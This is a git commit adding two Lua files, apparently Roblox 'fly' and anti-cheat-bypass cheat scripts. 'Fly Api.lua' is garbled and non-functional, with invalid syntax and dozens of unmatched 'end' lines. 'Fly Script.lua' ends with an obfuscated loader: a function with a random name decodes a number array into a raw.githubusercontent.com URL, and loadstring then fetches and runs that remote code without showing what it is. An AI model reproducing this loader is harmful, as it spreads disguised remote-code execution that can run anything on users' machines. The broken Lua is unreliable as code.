3ee3a27d41bac60f17cb84a32df5db2fdaa9f286
Synapse888 <egorixios@gmail.com>
2024-10-15 23:18:58 +0300

    Add files via upload

---
+++ Fly Api.lua
@@ -0,0 +1,56 @@
+callback = state
+function(state)
+local function = BypassAntiCheat = state
+local function = Fly = state 
+end
+
+local RunService = GetService.RunService
+local Players = GetService.Players
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local CurrentCamera = workspace.CurrentCamera
+local UserInputService = GetService.UserInputService
+local Unpack = table.unpack
+local GuiInset = GetService.GuiService:GetGuiInset()
+local Insert = table.insert
+local Network = GetService.NetworkClient
+local StarterGui = GetService.StarterGui
+
+script.Parent:Connect(function(state)
+local Player = game.Players.localPlayer
+  local Character = Player.Character
+  local Humanoid = Character:FindFirstChild("Humanoid")
+elseif first.Service.not.Working then
+getgenv().localPlayer = "game.Players.localPlayer"
+getgenv().localHumanoid = "game.Players.localPlayer.Humanoid"
+getgenv().localFly = "script.Parent.Fly = state"
+end
+                                                end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+   pcall return Service
+end,
+
+["Anti Fly"] = function(bypasser)
+        if bypasser then
+            if Fly = true then _G.BypassAntiCheat = true elseif first.Service.not.Working then 
+getgenv().localFly = "script.Parent.Fly = true"
+        else
+         if Fly = false elseif first.Service.not.Working then 
+getgenv().localFly = "script.Parent.Fly = false"   
+        end
+    end,
+    ['Anti Cheat'] = function(achbypasser)
+          _G.BypasserAntiCheat = true  
+        end
+    end,
+end
---
+++ Fly Script.lua
@@ -0,0 +1,26 @@
+--[[Services
+//////////////////////////////////////////////
+]]--
+makefolder("Services")
+local Player = game.Players.localPlayer
+  local Character = Player.Character
+  local Humanoid = Character:FindFirstChild("Humanoid")
+--[[Global Services
+//////////////////////////////////////////////
+]]--
+makefolder("Global Services")
+wait(0.5)
+getgenv().localPlayer = "game.Players.localPlayer"
+getgenv().localHumanoid = "game.Players.localPlayer.Humanoid"
+getgenv().localFly = "script.Parent.Fly = state"
+--[[local Script Service
+//////////////////////////////////////////////
+]]--
+wait(0.1)
+makefolder("local Script Service")
+function immifsklTSmLlTsqvtOfEbQqyZRJlipALCuxOIvkYLTUUPpnWIAQjwfETpwZyBx(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
+--[[Script
+//////////////////////////////////////////////
+]]--
+makefolder("Script")
+loadstring(game:HttpGet(immifsklTSmLlTsqvtOfEbQqyZRJlipALCuxOIvkYLTUUPpnWIAQjwfETpwZyBx({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,8715,12705,11550,10185,11760,12075,10605,5880,5880,5880,4935,11340,11655,11340,4935,11970,10605,10710,12075,4935,10920,10605,10185,10500,12075,4935,11445,10185,11025,11550,4935,11655,10290,10710,4830,11445,10185,11025,11550,9975,11340,11655,11340,4830,11340,12285,10185}), true))()    
